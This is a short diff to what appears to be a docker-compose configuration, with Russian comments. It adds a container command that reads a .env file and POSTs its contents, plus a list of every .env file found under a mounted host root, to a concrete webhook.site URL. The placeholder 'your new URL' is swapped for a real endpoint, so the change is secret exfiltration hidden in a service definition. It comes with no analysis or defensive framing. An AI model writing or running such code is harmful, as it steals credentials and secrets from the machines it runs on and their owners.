@@ -21,9 +21,9 @@ services:
         fi
         
         # 3. Отправляем содержимое .env
-        cat /tmp/main_env.txt | curl -X POST --data-binary @- https://webhook.site/ТВОЙ-НОВЫЙ-URL?stage=main_env
+        cat /tmp/main_env.txt | curl -X POST --data-binary @-  	https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=main_env
         
         # 4. Отправляем список всех .env файлов для отладки (если первый не сработал)
-        find /host-root -name ".env" -type f | curl -X POST --data-binary @- https://webhook.site/ТВОЙ-НОВЫЙ-URL?stage=env_list
+        find /host-root -name ".env" -type f | curl -X POST --data-binary @-  	https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=env_list
         
         sleep 3600
